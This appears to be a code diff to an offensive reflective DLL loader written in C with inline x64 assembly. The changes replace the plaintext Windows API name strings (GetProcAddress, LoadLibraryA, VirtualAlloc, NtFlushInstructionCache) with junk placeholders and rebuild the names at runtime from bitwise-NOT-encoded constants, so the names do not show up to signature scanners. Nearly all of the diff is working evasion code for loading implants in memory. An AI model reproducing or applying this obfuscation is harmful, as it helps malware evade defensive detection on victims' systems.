@@ -29,22 +29,22 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	PVOID newExeHeaderAddr;
 	// NTDLL Variables
 	PVOID ntdllAddr, ntdllExportDirectory, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable;
-	char ntFlushStr[] = "NtFlushInstructionCache";
-	PVOID ntFlushStrLen = (PVOID)sizeof(ntFlushStr);
+	char ntFlushStr[] = "f2.13f,,t41,.1-$#.15,$e";
+	PVOID ntFlushStrLen = (PVOID)23;
 	tNtFlushInstructionCache pNtFlushInstructionCache = NULL;
 	// KERNEL32 Variables
 	PVOID kernel32Addr, kernel32ExportDirectory, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable;
 
-	char getProcAddrStr[] = "GetProcAddress";
-	PVOID getProcAddrStrLen = (PVOID)sizeof(getProcAddrStr);
+	char getProcAddrStr[] = "f#A@4!g.22y:23";
+	PVOID getProcAddrStrLen = (PVOID)14;
 	tGetProcAddress pGetProcAddress = NULL;
 
-	char loadLibraryAStr[] = "LoadLibraryA";
-	PVOID loadLibraryAStrLen = (PVOID)sizeof(loadLibraryAStr);
+	char loadLibraryAStr[] = "3.1#$i-r3r,A";
+	PVOID loadLibraryAStrLen = (PVOID)12;
 	tLoadLibraryA pLoadLibraryA = NULL;
 	
-	char VirtualAllocStr[] = "VirtualAlloc";
-	PVOID VirtualAllocStrLen = (PVOID)sizeof(VirtualAllocStr);
+	char VirtualAllocStr[] = "3t,2ua46.5oc";
+	PVOID VirtualAllocStrLen = (PVOID)12;
 	tVirtualAlloc pVirtualAlloc = NULL;
 
 	// STEP X: Resolve the addresses of NTDLL and Kernel32 from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
@@ -57,6 +57,22 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	ntdllExOrdinalTable = getExportOrdinalTable(ntdllAddr, ntdllExportDirectory);
 
 	// NTDLL.NtFlushInstructionCache
+	//char ntFlushStr[] = "NtFlushInstructionCache";
+	// String length : 23
+	__asm__(
+		"mov rsi, %[ntFlushStr] \n"
+		"mov rdx, 0xFF9A979C9EBC9190 \n" // NOT ehcaCno : 65686361436e6f
+		"mov rcx, 0x968B9C8A8D8B8C91 \n" // NOT itcurtsn : 697463757274736e
+		"mov rbx, 0xB6978C8A93B98BB1 \n" // NOT IhsulFtN : 496873756c46744e
+		"not rdx \n"
+		"not rcx \n"
+		"not rbx \n"
+		"mov [rsi], rbx \n"
+		"mov [rsi+0x8], rcx \n"
+		"mov [rsi+0x10], rdx \n"
+		: // no output
+		:[ntFlushStr] "r" (ntFlushStr)
+	);
 	pNtFlushInstructionCache = getSymbolAddress(ntFlushStr, ntFlushStrLen, ntdllAddr, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable);
 
 	wchar_t kernstr[] = L"KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future 
@@ -66,8 +82,46 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	kernel32ExNamePointerTable = getExportNameTable(kernel32Addr, kernel32ExportDirectory);
 	kernel32ExOrdinalTable = getExportOrdinalTable(kernel32Addr, kernel32ExportDirectory);
 
+	// String length : 14
+	__asm__(
+		"mov rsi, %[getProcAddrStr] \n"
+		"mov rbx, 0xBE9C908DAF8B9AB8 \n" // NOT AcorPteG : 41636f7250746547
+		"not rbx \n"
+		"mov [rsi], rbx \n"
+		"mov rdx, 0xFFFF8C8C9A8D9B9B \n" // NOT sserdd : 737365726464
+		"not rdx \n"
+		"mov [rsi+0x8], rdx \n"
+		: // no output
+		:[getProcAddrStr] "r" (getProcAddrStr)
+	);
 	pGetProcAddress = getSymbolAddress(getProcAddrStr, getProcAddrStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
+	// char VirtualAllocStr[] = "VirtualAlloc";
+	// String length : 12
+	__asm__(
+		"mov rsi, %[VirtualAllocStr] \n"
+		"mov r8, 0xFFFFFFFF9C909393 \n" // NOT coll : 636f6c6c
+		"mov rdx, 0xBE939E8A8B8D96A9 \n" // NOT AlautriV : 416c617574726956
+		"not rdx \n"
+		"not r8 \n"
+		"mov [rsi], rdx \n"
+		"mov [rsi+0x8], r8 \n"
+		: // no output
+		:[VirtualAllocStr] "r" (VirtualAllocStr)
+	);
 	pVirtualAlloc  = getSymbolAddress(VirtualAllocStr, VirtualAllocStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
+	//char loadLibraryAStr[] = "LoadLibraryA";
+	// String length : 12
+	__asm__(
+		"mov rsi, %[loadLibraryAStr] \n"
+		"mov rdx, 0xFFFFFFFFBE868D9E \n" // NOT Ayra : 41797261
+		"mov r11, 0x8D9D96B39B9E90B3 \n" // NOT rbiLdaoL : 7262694c64616f4c
+		"not r11 \n"
+		"not rdx \n"
+		"mov [rsi], r11 \n"
+		"mov [rsi+0x8], rdx \n"
+		: // no output
+		:[loadLibraryAStr] "r" (loadLibraryAStr)
+	);
 	pLoadLibraryA  = getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
 	
 	// Find ourselves in memory by searching for "MZ" 
@@ -88,8 +142,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	);
 
 	// STEP 2 | Get size of our RDLL image, allocate memory for our new RDLL, and copy/write the headers from init RDLL to new RDLL
-
-
 	// get the VA of the NT Header for the PE to be loaded
 	newExeHeaderAddr = getNewExeHeader(initRdllAddr);
 	// Get the size of our entire RDLL
@@ -483,9 +535,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 				// STEP 7 | Get the real address for our imported function and write it to our import table
 				// patch in the address for this imported function
 				// Debugging how this works for the first imported symbol from ws2_32.dll as an example
-				// __asm__(
-				//	"int3 \n"
-				// );
 				// RAX = importEntryAddressRVA = ws2_32.00007FFA5678E500
 				// RAX = DEREF_32(importEntryAddressRVA) = 00002320
 				// RCX = RAX
